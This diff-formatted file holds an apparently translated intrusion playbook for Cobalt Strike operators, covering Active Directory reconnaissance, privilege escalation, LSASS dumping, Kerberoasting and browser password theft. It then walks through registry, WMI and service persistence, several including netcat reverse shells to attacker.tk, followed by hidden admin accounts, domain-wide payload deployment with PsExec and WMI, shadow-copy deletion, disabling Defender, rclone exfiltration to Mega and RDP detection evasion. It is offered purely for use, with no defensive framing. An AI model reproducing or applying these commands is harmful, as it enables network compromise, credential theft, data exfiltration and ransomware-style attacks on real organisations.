@@ -1,0 +1,589 @@
+													MAMANUAL COBALT STRIKE
+!-------------------------
+Standard Commands 
+---------------------------------------------------!							
+
+Load Creation
+Attacks->Packages->
+
+select agent
+help->shows a list of commands
+help [command] will show help for a certain command
+
+!--------------------------------------------------
+Gathering Information AD
+--------------------------------------------------!
+
+!---Getting Domain Controllers---!
+Net Domain_controllers
+net dclist
+shell nltest /dclist
+
+!---Getting the list of computers---!
+shell net group "Domain Computers" /domain
+net computers
+net view
+Get-ADComputer -Filter {enabled -eq $true} -properties *|select Name, DNSHostName, OperatingSystem !--Test--!
+
+!---Get list of subdomains---!
+net domain_trusts
+shell nltest /DOMAIN_TRUSTS
+
+Get list of groups and users--!
+shell net group "domain Admins" /domain - list of Domain Admins; for Germans - shell net group "Domänen-Admins" /domain
+shell net group "Enterprise Admins" /domain - Enterprise admins
+shell net group "domain users" /domain - list of Domain users
+net group
+net localgroup
+net user
+
+!---Advanced---!
+net domain|systeminfo | findstr /B "Domain" - Will show which domain the PC is in
+net sessions - Shows active sessions on the desktop
+net time - Shows the time on the PC
+net logons - Shows lists of users who are logged in to the PC
+
+!---Getting ShareFinder---!
+net share - Shows the list of sharers on your PC
+
+Gather the available Shares and see if any $ADMIN shares are available for our current user in the domain.
+	- powershell-import /opt/PowerSploit-dev/Recon/PowerView.ps1
+	- powershell Invoke-ShareFinder -CheckShareAccess -Verbose
+Analogue:
+	- powershell-import /opt/PowerSploit-dev/Recon/ShareFinder.ps1
+	
+	- psinject 4728 x86 Invoke-ShareFinder -CheckShareAccess -Verbose | Out-File -Encoding ascii C:\ProgramData\found_shares.txt
+(at this moment the scan is scanned and the result is written into a file, the file will be full size when the scan is finished and you can download it)
+
+Also, do not forget to watch the processes by using ps command, there you can find a user, migrate to his process > Explore > Process list > then select the process of another user.
+After migrating to a new user you also need to remove the balloons to see where you can break through with it
+When you uncheck the balloons and after you uncheck it, go to C:\ProgramData and download sh.txt or shares.txt and see how many "remote admin" files you have and if there is more than one, this will mean you have access to the other computer 
+
+
+!---
+Auxiliary tool
+---!
+
+!-Gathering information about Active Directory membership with AdFind.exe-!
+	- load adfind.exe and adf.bat into a writable folder
+	- move Cobalt Strike beacon into the folder
+	- run shell adf.bat
+	- wait for script to finish
+	- download the result and delete what you downloaded to your machine
+	
+Contents of adf.bat:
+
+adfind.exe -f "(objectcategory=person)" > ad_users.txt
+adfind.exe -f "objectcategory=computer" > ad_computers.txt
+adfind.exe -f "(objectcategory=organizationalUnit)" > ad_ous.txt
+adfind.exe -sc trustdmp > trustdmp.txt
+adfind.exe -subnets -f (objectCategory=subnet)> subnets.txt
+adfind.exe -f "(objectcategory=group)" > ad_group.txt
+adfind.exe -gcb -sc trustdmp > trustdmp.txt
+	
+!-Gathering information about the current machine with SeatBelt!
+	- execute-assembly /opt/cobalt_strike_extension_kit/exe/Seatbelt.exe -group=all -outputfile="C:\ProgramData\textinfo.txt"
+(no explanations here, the number of checks there is decent and all the information gathered is to some extent important both on the local machine and on the network)
+
+
+!---------------------------------------------
+Privilege Enhancement Techniques
+-----------------------------------------------!
+
+!---
+Use of exploits
+---!
+shell systeminfo - Get information about the system.
+The information you get should be written to a text file (win10-systeminfo.txt).
+Use Windows-Exploit-Suggester, it will show you approximately which exploits you need to use.
+!---
+Updating the exploits database
+---!
+/windows-exploit-suggester.py --update
+[*]
+[*] successfully requested base url
+[*] scraped ms download url
+[+] writing to file 2021-03-09-mssb.xls
+[*] done
+!---
+Running the program for detection
+---!
+./windows-exploit-suggester.py --database 2021-03-09-mssb.xls --systeminfo win10-systeminfo.txt
+
+Then according to the list of exploits given by Windows-Exploit-Suggester, apply it on the machine. (But before you should read about exploit, which you want to use, may be so that it does not suit your purpose, pay special attention to OS version and bit depth).
+For example:
+Option#1:
+elevate ms16-135 [listener] - the command uses exploit ms16-135 and if successfully triggered will call a new session from under SYSTEM.
+
+Option#2:
+For example go to this directory C:\Users\User1\Pictures (you can go to any other directory, as long as you can load the load)
+Download your load upload artifact.exe|dll|One-liner
+runasadmin ms16-032 (Specify directory)artifact.exe [Option if needed] command uses exploit ms16-032 to run your load from under SYSTEM. In this case you will get a new agent from under SYSTEM.
+
+										
+
+
+
+
+!---
+SharpUp
+---!
+
+SharpUp is a misconfiguration scanner for privilege escalation.
+We do the scanning:
+	- execute-assembly /opt/cobalt_strike_extension_kit/exe/SharpUp.exe
+Example output(There may be nothing to find):
+
+=== SharpUp: Running Privilege Escalation Checks ===
+
+=== Modifiable Services ===
+Name :VMtools
+DisplayName :VMware Tool
+Discription :Provides support for synchronizing objects between the host and qwest operation system.
+State :Stopped
+StartMode :Auto
+PathName :C:\Program Files\VMware\VMware Tools\vmtoolsd
+=== Modifiable Service Binaries ===
+
+=== AlwaysInstallElevated Registry Keys ===
+
+=== Modifiable Folders in %PATH% ===
+
+=== Modifiable Registry Autoruns ===
+
+=== *Special* User Privileges ===
+
+=== Unattended Install Files ===
+
+=== McAfee Sitelist.xml Files ===
+
+=== Cached GPP Password ===
+
+We can see that our user can modify the VMtools service to run the load.
+Go to Attacks --> WindowsExecutable (S) --> choose our [Listener] and output Windows Service EXE --> Generate -->FileName:vmtoolsd.exe --> Save
+Next, we put it in any directory, e.g: C:\Users\User1\Pictures and load our load.
+Now we modify the service:
+run sc config vmtoolsd binpath=C:\Users\User1\Pictures\vmtoolsd.exe
+run start vmtoolsd.exe
+After that the agent should come from under SYSTEM.
+
+!------------------------------------------
+Get hashes and passwords
+------------------------------------------------!
+
+(CAN BE PERFORMED WITHOUT PRIVILEGES)
+!----kerberoast attack - get hashes from memory-!
+
+Perform a kerberoast attack:
+	- execute-assembly /opt/cobalt_strike_extension_kit/exe/Rubeus.exe kerberoast /ldapfilter:'admincount=1' /format:hashcat /outfile:C:\ProgramData\hashes.txt
+	- execute-assembly /opt/cobalt_strike_extension_kit/exe/Rubeus.exe asreproast /format:hashcat /outfile:C:\ProgramData\asrephashes.txt
+	- unload these files (if they work)
+	- If they didn't give us results, we will use alternative powershell script to execute the attack:
+	- powershell-import /opt/PowerSploit-dev\Recon\PowerView.ps1
+		Analogue:
+	- powershell-import /opt/PowerSploit-dev\Recon\Invoke-Kerberoast.ps1
+	- psinject 4728 x86 Invoke-Kerberoast -OutputFormat HashCat | fl | Out-File -FilePath c:\ProgramData\pshashes.txt -append -force -encoding UTF8 
+            4728 in this case is the current pid and x86 is its bit size
+      (obtained hashes will be sent to brute force to get cleartext passwords or will be used in the context of SYSTEM rights)
+	  
+Collecting information from Chrome browser
+	- execute-assembly /opt/cobalt_strike_extension_kit/exe/SharpChrome.exe logins /showall
+(here we get the password set of the current user and some idea of what network and external resources he is accessing)
+	  
+Checking for saved passwords in domain group policy files
+	- execute-assembly /opt/cobalt_strike_extension_kit/exe/Net-GPPPassword.exe
+	Analogue:
+	- powershell-import /opt/PowerSploit-dev/Exfiltration/Get-GPPPassword.ps1
+	  
+(WITH PRIVILEGED RIGHTS ONLY*)
+
+If we have PRIVILEGED rights, with "hashdump" and "logonpasswords" we can get the hashes and the passwords. This is a fast way to get passwords, but it may not work. For example the AV will interfere.
+A better way to do it is this:
+	- Do ps and find the LSASS.exe process (It stores our passwords).Remember the PID.
+	- Make its dump.
+Go to beacon:
+	- cd Windows
+	- shell rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump PID C:\Users\User1\lsass.dmp full 
+	- In PID parameter specify PID number of LSASS.exe
+	- You can use any writeable directory, for example: C:\Users\User1\lsass.dmp
+Analogue of:
+	- execute-assembly /opt/cobalt_strike_extension_kit/exe/SharpDump.exe
+When you make the dump, download it.
+Once downloaded, open mimikatz on your machine and run the following commands. (Put lsass.dmp in the folder with mimikatz)
+sekurlsa::minidump lsass.dmp
+sekurlsa::logonPasswords
+
+
+
+!------------------------------------------------------Persistence-----------------------------------------------------!
+(CAN BE DONE WITHOUT PRIVILEGES)
+Create explorers.bat and add this code (don't copy brackets):
+}
+	@echo off
+	set fullname=C:\Temp\explorers.exe
+	set prog=explorers.exe
+	:begin
+	tasklist /fi "IMAGENAME eq %prog%"|>nul find "%prog%"||start "" "%fullname%"
+	>nul ping 127.1 -n 6
+	goto :begin 
+}
+Next, load our load explorers.exe and the explorers.bat batchbook into any directory where you can write the files, e.g: "C:\Users\User1\Pictires"
+Next, open CS and open our beacon and go to the folder where you have downloaded our files
+Execute the command (this will hide our files): 
+shell attrib +h [explorers.exe]
+shell attrib +h [explorers.bat]
+Next, we add the keys to the registry:
+shell reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v explorers /t REG_SZ /d "C:\Temp\explorers.exe"
+shell reg add "HKEY_CURRENT_USER/Software\Microsoft\Windows\CurrentVersion\Run" /v explorers /t REG_SZ /d "C:\Temp\explorers.bat"
+Check:
+shell reg query "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /s
+------------------------------------------------------------------------------------------------------------------------------------
+
+You can use powershell stager, but if you run it as a normal user, the cmd window will appear on your desktop and close right away
+{
+@echo off
+set fullname=powershell.exe
+set paramtr= powershell -nop -w hidden -encodedcommand...(your stager) 
+set prog=powershell.exe
+:begin
+tasklist /fi "IMAGENAME eq %prog%"|>nul find "%prog%"||start "" "%fullname%" "" "%paramtr%"
+>nul ping 127.1 -n 6
+goto :begin
+}
+Next we add the key to the registry:
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v explorers /t REG_SZ /d "C:\Temp\explorers.bat"
+Checking:
+reg Query "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /s
+
+You can also write a registry key in this directory reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run, but you need PRIVILEGE RIGHTS* to create a key in this directory
+
+
+!---In-memory---!
+Implementing a backdoor that will hang in RAM makes sense if you want to get a foothold on the target machine without leaving any traces. Antiviruses usually have little control over in-memory activity, as it entails a large additional drain on resources. Even an experienced user is unlikely to notice anything hidden inside a legitimate process.
+As an in-memory backdoor we will use meterpreter. It is probably the most famous RAT which is able to work exclusively in memory and doesn't touch the disk.
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=8888 -f raw -o meter32.bin exitfunc=thread StagerRetryCount=999999
+cmd$> inject_windows.exe PID meter32.bin
+
+The maximum stealth is paid for by the loss of persistence after reboot.
+Since the malicious thread is started outside any library, Procexp will often show it as running from a null address.
+
+Office
+This method is suitable if the attacked user often works with an office suite. Not so rare!
+reg add "HKCU\Software\Microsoft\Office test\Special\Perf" /t REG_SZ /d C:\users\username\meter.dll
+
+    Pros: survives reboot, any user will do.
+    Minus: unmanageable startup interval.
+
+(ONLY WITH PRIVILEGED RIGHTS*)
+
+
+
+
+!---
+Latching on via "Task Scheduler" ---
+---!
+
+Latching through the Task Scheduler will be done by importing our ready-made xml.
+1) Run the ready-made Python script, and generate the xml.
+This script will require a few parameters:
+	- start programm is what will run this task, powershell.exe | artifact.exe | rundll32.exe
+	- stager PowerShell or other parameters - parameters passed to the program to start, for powershell.exe - it is stager PowerShell, artifact.dll [Parameter]
+	- date registration task - date of task registration, may be consulted for another task, which you want to mask.
+	- date end task - date when task finishes
+	- time repeat task in day - how often the task will be repeated, "PT3M" - every 3 minutes; "PT1P" - every hour; if the program is running, the task will not start a new program session
+	- name_xml - the name of your xml, use names like: Adobe Update, WindowsDefender, etc...
+This will generate the desired xml. Next, download it to the client PC, which you want to fix.
+After this you go to the directory where you downloaded our xml and in the beacon enter the command:
+shell schtasks /Create /RU SYSTEM /XML Security_Update.xml /TN WinDefender 
+After that delete the xml, we do not need it anymore.
+rm Security_Update.xml
+
+
+!---
+Services
+---!
+Use the services for the persistence because Service Manager will restart the service itself if needed.
+
+shell sc create persistence binPath= "nc.exe -e \windows\system32\cmd.exe attacker.tk 8888" start= auto
+shell sc failure persistence reset= 0 actions= restart/60000/restart/60000/restart/60000
+shell sc start persistence 
+
+    Pros: survives reboot, controlled startup interval, any user can do it.
+    Minus: administrator rights are required.
+
+!---
+Configure
+---!
+Organizing persistence through OS configuration changes is a great way to hide from antivirus. This is the only case where we do not use any executable code at all. But this only applies if we have direct access to the target machine.
+Creating a hidden user which can then be used for remote access is probably the best known variant of this attack.
+
+net user attacker p@ssw0rd /add
+net localgroup administrators /add attacker
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v attacker /t REG_DWORD /d 0 /f
+
+Easy and efficient way to implement a bookmark in Windows via RDP:
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t reg_sz /d "\windows\system32\cmd.exe"
+reg add "HKLM\system\currentcontrolset\control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0x0 /f
+
+    Pros: hard to detect with antivirus, survives reboot.
+    Cons: Requires admin/root rights, not suitable if machine is behind NAT or firewall.
+
+!---
+Debugger
+---!
+If the attacker knows that the attacked user often runs some program, say a calculator, he can inject his code into the body of this program with the help of the debugger. However, any tampering with executable files inexorably makes the antivirus more distrustful of them. A much more elegant execution would be to intercept the launch:
+copy calc.exe _calc.exe
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe" /v Debugger /t reg_sz /d "cmd /C _calc.exe & c:\windows\nc.exe -e c:\windows\system32\cmd.exe attacker.tk 8888" /f
+
+Once the attacker starts and then closes the calculator, the attacker will take a reverse shell.
+
+    Pros: survives a reboot.
+    Minus: requires administrator rights.
+
+!---
+Debugger
+---!
+If an attacker knows that the attacked user often runs some program, say a calculator, he can inject his code into the body of this program using a joystick. However, any tampering with executable files inexorably makes the antivirus more distrustful of them. A much more elegant execution would be to intercept the launch:
+copy calc.exe _calc.exe
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\calc.exe" /v Debugger /t reg_sz /d "cmd /C _calc.exe & c:\windows\nc.exe -e c:\windows\system32\cmd.exe attacker.tk 8888" /f
+
+Once the attacker starts and then closes the calculator, the attacker will take a reverse shell.
+
+    Pros: survives a reboot.
+    Minus: requires admin rights.
+ 
+!---Gflags---!
+Almost in the same way you can arrange to run your code when user closes a certain program.
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512
+reg add "HKLM_SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "nc -e \windows\system32\cmd.exe attacker.tk 8888"
+
+    Pros: survives reboot.
+    Minus: requires administrative privileges.
+
+Autoruns doesn't detect this method, but you can check the registry branch:
+HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit
+ 
+!---WMI---!
+A rather reliable way of autorun is through WMI events. We can run the backdoor at regular intervals.
+wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="persistence", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="persistence", ExecutablePath="C:\users\admin\meter.exe",CommandLineTemplate="C:\users\admin\meter.exe"
+wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name="persistence"",Consumer="CommandLineEventConsumer.Name="persistence""
+
+    Pros: survives reboot, controlled startup interval.
+    Cons: requires administrator rights.
+
+!---AppInit---!
+In Windows there is an interesting way to implement libraries in windows applications with AppInit (they should use user32.dll).
+reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t reg_dword /d 0x1 /f
+reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t reg_sz /d "c:\path\to\meter64.dll" /f
+reg add "HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t reg_dword /d 0x1 /f
+reg add "HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t reg_sz /d "c:{path\to\meter32.dll" /f
+
+    Pros: survives reboot.
+    Cons: requires administrator rights, unmanageable startup interval.
+
+!---Lsass---!
+Another possibility is to put the library in the system process lsass. This is quite an advantageous place, because this process stores the very credentials we retrieve with the mimikatz utility.
+reg add "HKLM\system\currentcontrolset\control\lsa" /v "Notification Packages" /t reg_multi_sz /d "rassfm\0scecli\0meter" /f
+
+    Pros: survives reboot.
+    Cons: administrator rights required, unmanageable startup interval, can kill the system.
+
+!---Winlogon---!
+You can use Winlogon to open a shell every time someone logs in.
+reg add "HKLM\software\microsoft\windows nt\currentversion\winlogon" /v UserInit /t reg_sz /d "c:\windows\system32\userinit.exe,c:\windows\meter.exe"
+
+    Pros: survives reboot.
+    Minus: unmanageable startup interval.
+
+!---Netsh---!
+The network configuration utility Netsh also allows you to load an arbitrary library. This makes it possible to set up an improvised autoloading system. The result will look harmless, because it is originally a Windows system component.
+cmd#> c:\windows\syswow64\netsh.exe
+netsh> add helper c:\windows\meter32.dll
+cmd#> reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v persistence /t REG_SZ /d "C:\Windows\SysWOW64\netsh.exe"
+
+As a result we get the following chain: autorun → netsh.exe → meter.dll.
+In this case meter.dll will be hidden from user's eyes - he will only see the launch of legitimate Netsh, a native Windows component.
+
+    Pros: survives reboot, hard for the user to detect.
+    Minus: requires administrator rights.
+
+
+ 
+
+!----------------------------------------------------Lateral Movement---------------------------------------------------!
+
+If we managed to get the username and password of the user on the victim PC, do spawnas Domain\Admin Password [listener], a new agent will come, the process will run under this user.
+
+If we found the username/password domain of an admin or user, we can take his token, the command looks like this 
+	- make_token Domain\Admin Pass
+if you want to take the token off, the command
+	- rev2self
+
+Go to the menu Cobalt Strike-->Visualization-->Target Table or click on the target icon.
+This will be your targets after you do (net dclist, net domain_controllers, net computers, portscan)
+Click on the PC you want to jump to-->Jump:
+psexec
+psexec64
+psexecpsh
+ssh
+ssh-key
+winrm
+winrm64
+
+If we have a system process in the agent, we can use the getsystem command to raise the system permissions.
+
+If we found the user's login and hash and we couldn't decrypt the hash, we do the command pth Domain\Admin hash [command] 
+(We need privileged privileges), by issuing the commands:
+	- shell dir \\\ip 
+	- hostname\c$ 
+Check if you have access to the server or to a normal PC.
+If you have access, click on session > File Browser > write path \ip or hostname \c$ , load the load there 
+shell wmic /node:[ip] process call create "rundll32.exe C:\Temp\artifact.dll StartW"
+shell wmic /node:[ip] process call create "C:\Temp\artifact.exe" 
+
+
+
+!--------------------------------------------------Attacks-------------------------------------------------------------!
+!--BAT--!
+all always run as Administrator:
+uac - removes popup windows requesting permission to run as administrator
+defoff - kill defender (not working on everything, check for Mspeng process afterwards in taskmgr)
+RDP - bring up port 3389
+
+
+del - delete Shadow copy (requests permission to delete, push y)
+NS - mount hidden system disks (pass:98) !
+
+NLA+BACK - corrects NLA + backdoor to logon without password, works like this: 
+      at login window (where it asks for credentials) - press win+Y - cmd window pops up
+      type taskmgr, open "users" tab, click on any user - connect
+p.s - it doesn't work on tens \requires a pass 
+
+
+ASSEMBLE THE BATCH FILE ACROSS THE DOMAIN
+start PsExec.exe /accepteula @C:\share$\comps1.txt -u DOMAIN\ADMINISTRATOR -p PASSWORD cmd /c COPY "\PRIMARY DOMAIN CONTROLLER\share$\fx166.exe" "C:\windows\temp\" 
+SAVE IT AS "COPY.BAT"
+
+BUILDING A BATCH FILE TO RUN DOMAIN-WIDE
+start PsExec.exe -d @C:\share$\comps1.txt -u DOMAIN\ADMINISTRATOR -p PASSWORD cmd /c c:\windows\temp\fx166.exe
+SAVE IT AS "EXE.BAT"
+
+WMI BATCH JOB TO COPY AND RUN THE FILE AROUND THE DOMAIN
+start wmic /node:@C:\share$\comps1.txt /user: "DOMAIN\Administrator" /password: "PASSWORD" process call create "cmd.exe /c bitsadmin /transfer fx166 \DOMAIN CONTROLLER\share$\fx166.exe %APPDATA%\fx166.exe
+
+
+!--------------------------------------------------------RDP------------------------------------------------------------!
+IF YOU REALLY NEED RDP IN THE LOKAL :: HOW NOT TO GET CAUGHT ::
+1. Choose server OS, ping, found. Do a dir listing
+`ls \\\\REMOTE-HOSTNAME\C$\Users`.
+Sorting by Modified. Where there is a fresh touch - under these users definitely DO NOT log in because it's easy to get the following situation - you came in, downloading balls/testing something and suddenly this user logs in to this PC and sees your results... Detect. Cleaning. End game.
+To do this, select a polzak who on this server went last year, say.
+I think the mechanics of it is clear?
+2. Select the user from YES, which is in YES, but almost never used.
+
+shell net group "Domain Admins" /domain
+
+
+This is a list of our DAs
+Next, we'll take our user information one by one
+`shell net user Administrator /domain`
+Look for Last Logon line - i.e. when was last logged on the network (on any of the computers in the network)
+If there is a date like the month before last month, half a year or even a year - great. That's what we need. Most likely it's either a service account or admin they do not go and you on the RDP, he certainly does not interfere.
+
+These are simple tricks that will not help you get caught on RDP
+
+Do not spend too much time on RDP, after we finished - do Logoff (OBLIGATORY). Not to be confused with just closing RDP window.
+
+!---------------------------------------------
+Additional Material
+-------------------------------------------------------!
+
+!---RCLONE MANUAL--!
+1. download rclone from the off site, create file rclone.conf and put it in the same folder with the exe
+2. Then open cmd from the admin, go to the folder with the configuration file and run the command: rclone config
+3. Then pop up menu, where we create a config (roughly speaking, we enter the login and password for the mega), after we have entered the credentials, the program writes them into the file rclone.conf, in encrypted form.
+4. Take this file rclone.conf and the program itself and put it on the host, from which we are going to pull information, put it in a secluded place, of course
+5. Go to CS beacon in the folder where you put the config and the program and run the command:
+
+shell rclone.exe copy "\trucamtldc01\E$\Data" remote:Data -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12
+
+remote:Data - just change this. 
+"remote" is the name of your mega.
+"NT" is your directory in the mega where it will be downloaded to, if it doesn't exist, it will create it itself.
+
+i think it is clear that the quoted part is what you download, you can specify anything, even the entire disk
+remote - the name of the config file you specified in step 3.
+
+!---SonicWall---!
+For those who want to work with SonicWall through browser sessions
+Using WEB-browser to access
+
+- take a session from the script output, for example "47ZjFKx24Nj2h0UtZKX2OYnZLgRg05aX2SuaotVzrQg="
+- Open the browser in incognito mode, open the developer's console (js-console)
+- Encode ID of the session in base64
+  >> btoa ("47ZjFKx24Nj2h0UtZKX2OYnZLgRg05aX2SuaotVzrQg=") [ENTER]
+  "NDdaakZLeDI0TmoyaDBVdFpLWDJPWW5aTGdSZzA1YVgyU3Vhb3RWenJRZz0="
+- type in URL https://target (redirects to https://target/cgi-bin/welcome)
+- go into the application/cookies in the console, add the cookie
+  swap : NDdaakZLeDI0TmoyaDBVdFpLWDJPWW5aTGdSZzA1YVgyU3Vhb3RWenJRZz0=
+- in your browser (where .../cgi-bin/welcome) change URL to https://target/cgi-bin/portal
+- access the resource under the user's session
+
+Installing and configuring Citrix...!
+----------------------------------
+Windows 7 or Windows 10 
+Na nee InternetExplorer 11 or google chrome
+Posle ustanovki braruzera nastraivaem Citrix Workspace
+
+Dlya win 7: https://www.citrix.com/en-gb/downloads/workspace-app/legacy-workspace-app-for-windows-ltsr/workspace-app-for-windows-1912-ltsr-cu2.html
+Dlya win10: https://www.citrix.com/en-gb/downloads/workspace-app/windows/workspace-app-for-windows-latest.htmlhttps://www.citrix.com/en-gb/downloads/workspace-app/windows/workspace-app-for-windows-latest.htmla win 10: 
+https://www.citrix.com/en-gb/downloads/workspace-app/windows/workspace-app-for-windows-latest.html
+
+Ustanavlivaem citrix
+Dalee v brauzere vhodim v web-interface citrixa, vvodim login-pass potom zapuskaem deesktop (otkroetsya libo v browere or v citrixAPP) 
+
+after vhoda v desktop - podtyagivaem agenta v CS
+
+!------------------------------------------------------Questions----------------------------------------------------------!
+
+
+14) If you found a password, you can also run it through smb_login - an instrument in metasploit, I will give you a metasploit and tell you how to use it. smb_login will show what servers or woks, have access with these codes
+
+How to sort the collected AD from the network
+1) Download FileZilla.
+Download Putty, launch Putty via tor
+Go here https://www.torproject.org/download/tor/
+Download WARNING Expert Bundle.
+Unzip it, go to the Tor directory and run tor.exe
+In a few seconds it says 100% Done
+Go to Putty Proxy settings and set sox5, api 127.0.0.1 port 9050
+3) Go to the server via filesilla > go to the "Script" folder - put some AD files next to the script
+4) Switch to Putty, log on to the server, go to the directory where the script is, give the command 
+./script.sh
+5) All done, go back to FilleZilla and take our sorter. Make sure you delete the AD files and the sorter folder after yourself. If you don't want to delete the sorter folder, just change it to whatever you want to call it.
+
+
+USERCHANTER manual with it, we find these cars. Just ad_users requires us to get there SID, for golden ticket, but about this later.
+. make a list of tags 
+1.1 Open admin_users , find out who we are potentially interested in: admin / engineer / IT 
+Get logins from sAMAccountName
+1.2 Get the list of domains admins
+1.3 put them into the file list.txt
+
+Power View update.
+2.1 powershell-import _/home/user/soft/powerview/view.ps1_
+2.1 -comment: import powerview from /home/user/soft/powiew/view.ps1
+
+
+2.3 Hunting
+
+2.3.1 
+psinject 1884 x64 Invoke-UserHunter -Threads 20 -UserFile C:\ProgramData\list.txt >> C:\ProgramData\out.txt
+
+instead of 1884 - PID of the process where we have enough rights to inject.
+x64 - or x86 bitrate of the process. see in the tasklist
+In cProgramData\list.txt should lie the list that we did in point 1. 
+In 5-10-20 minutes you should see the result in out.txt. If the file is 0 bytes, it means that it works or AV has hit it (if AV has hit it, you will see it in the cob)
